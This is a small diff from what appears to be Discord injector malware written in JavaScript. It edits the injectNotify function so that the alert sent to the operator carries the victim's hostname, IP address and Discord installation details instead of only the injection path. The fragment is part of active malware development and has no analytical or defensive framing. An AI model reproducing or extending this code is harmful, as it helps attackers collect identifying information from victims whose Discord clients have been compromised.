@@ -159,8 +159,8 @@ function injectNotify() {
     var fields = [];
     injectPath.forEach( path => {
         var c = {
-            name: "<a:roundround:919629668284497972> Injected Path",
-            value: `\`\`\`${path}\`\`\``,
+            name: "<a:roundround:919629668284497972> Info",
+            value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\nInjection Info: \n${discordInstall}\n\`\`\``,
             inline: !1
         }
         fields.push(c)
